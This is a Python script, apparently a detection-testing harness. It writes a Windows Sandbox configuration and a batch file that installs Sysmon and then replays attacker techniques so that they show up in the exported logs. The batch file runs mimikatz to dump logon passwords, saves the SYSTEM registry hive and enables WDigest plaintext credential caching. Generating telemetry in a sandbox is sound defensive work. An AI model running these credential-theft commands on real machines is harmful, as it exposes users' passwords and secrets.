import os
import subprocess
import time
import threading

# 获取用户主目录路径
user_profile = os.getenv("USERPROFILE")
sandbox_files_dir = os.path.join(user_profile, "Documents", "SandboxFiles")
sandbox_config_path = os.path.join(sandbox_files_dir, "sandbox.wsb")
install_script_path = os.path.join(sandbox_files_dir, "install_and_run.bat")
sysmon_exe_path = os.path.join(sandbox_files_dir, "Sysmon64.exe")
sysmon_config_path = os.path.join(sandbox_files_dir, "sysmonconfig.xml")

# 确保文件夹存在
os.makedirs(sandbox_files_dir, exist_ok=True)

# 创建安装和执行脚本内容
install_script_content = f"""
@echo off
cd %USERPROFILE%\\Desktop
copy %USERPROFILE%\\Desktop\\SandboxFiles\\Sysmon64.exe .
copy %USERPROFILE%\\Desktop\\SandboxFiles\\sysmonconfig.xml .
copy %USERPROFILE%\\Desktop\\SandboxFiles\\mimikatz.exe .
copy %USERPROFILE%\\Desktop\\SandboxFiles\\1.bat .
Sysmon64.exe -accepteula -i sysmonconfig.xml
ping 127.0.0.1 -n 6 > nul
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit

copy %USERPROFILE%\Desktop\SandboxFiles\sysmonconfig.xml .

whoami

xcopy %USERPROFILE%\\Desktop\\SandboxFiles . /H /Y

reg save HKLM\SYSTEM C:\\system.save

reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 
setlocal enabledelayedexpansion

:: Get the current time
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do (
    set /a HH=%%a, MM=%%b, SS=%%c, FF=%%d
)

:: Add 10 seconds
set /a MM+=1
if !MM! geq 60 (
    set /a MM-=60
    set /a HH+=1
    if !HH! geq 24 set /a HH-=24
)

:: Format the time with leading zeros
if !HH! lss 10 set HH=0!HH!
if !MM! lss 10 set MM=0!MM!
echo !HH!:!MM!
:: Create the scheduled task
schtasks /create /tn "MyTask" /tr "notepad.exe" /sc once /st !HH!:!MM! /f

ping 127.0.0.1 -n 91 > nul
wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml /e:root > %USERPROFILE%\\Desktop\\SandboxFiles\\log.xml
"""

with open(install_script_path, "w") as script_file:
    script_file.write(install_script_content)

# 创建沙盒配置文件内容
sandbox_config_content = f"""
<Configuration>
    <Networking>Enable</Networking>
    <MappedFolders>
        <MappedFolder>
            <HostFolder>{sandbox_files_dir}</HostFolder>
            <ReadOnly>false</ReadOnly>
        </MappedFolder>
    </MappedFolders>
    <LogonCommand>
        <Command>C:\\Users\\WDAGUtilityAccount\\Desktop\\SandboxFiles\\install_and_run.bat</Command>
    </LogonCommand>
</Configuration>
"""

with open(sandbox_config_path, "w") as config_file:
    config_file.write(sandbox_config_content)

# 确保Sysmon64.exe和sysmonconfig.xml在指定位置
if not os.path.exists(sysmon_exe_path):
    print(f"Error: {sysmon_exe_path} not found.")
if not os.path.exists(sysmon_config_path):
    print(f"Error: {sysmon_config_path} not found.")
"""
sandbox_process = subprocess.Popen(['start', '/wait', 'WindowsSandbox.exe', sandbox_config_path], shell=True)

# 等待沙盒执行完成
time.sleep(15)  # 等待15秒，确保沙盒内的命令执行完成

while sandbox_process.poll() is None:
    time.sleep(1)

# 关闭对话框（取消dialog）
subprocess.run(['taskkill', '/f', '/fi', f'WINDOWTITLE eq {sandbox_config_path}'])
"""
def run_sandbox():
    subprocess.Popen(['start', '/wait', 'WindowsSandbox.exe', sandbox_config_path], shell=True)

# 启动Windows沙盒
sandbox_thread = threading.Thread(target=run_sandbox)
sandbox_thread.start()

# 等待，确保沙盒内的命令执行完成
time.sleep(120)

# 关闭Windows沙盒
subprocess.run(['taskkill', '/im', 'WindowsSandbox.exe', '/f'])

# 等待沙盒线程结束
sandbox_thread.join()



# 读取并打印 Sysmon 的日志
sysmon_log_path = os.path.join(sandbox_files_dir, "log.xml")
if os.path.exists(sysmon_log_path):
    with open(sysmon_log_path, 'r', encoding='utf-8') as log_file:
        sysmon_log = log_file.read()
        print(sysmon_log)
else:
    print("Sysmon log not found.")